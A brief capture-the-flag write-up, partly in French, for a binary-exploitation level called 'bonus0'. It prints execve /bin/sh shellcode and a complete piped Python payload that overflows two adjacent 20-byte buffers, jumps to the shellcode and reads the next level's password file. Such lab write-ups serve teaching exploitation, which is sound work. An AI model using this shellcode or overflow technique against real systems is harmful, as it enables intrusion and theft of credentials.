# bonus0

We will use this shellcode:
```
\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

On comprends dans le code qu'on a deux buffers de 20 chars chacun. Si notre 1er read est plus long que 20 chars, cela va overwrite le `\0` et on peut ainsi concat nos deux payloads ensemble.

Comme le shellcode fait 24 bytes, on écrit les 20 premiers, puis les 4 derniers, on remplit de dummy chars, puis l'adresse de notre payload car on jump grâce au buffer overflow. On rajoute des dummy chars pour aligner la stack.

Payload:
```bash
$> ((python -c "print('\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99')"); (python -c "print('\xb0\x0b\xcd\x80' + 'A' * 5 + '\x26\xf7\xff\xbf' + 'A' * 7)"); echo "cat /home/user/bonus1/.pass") | ./bonus0
```
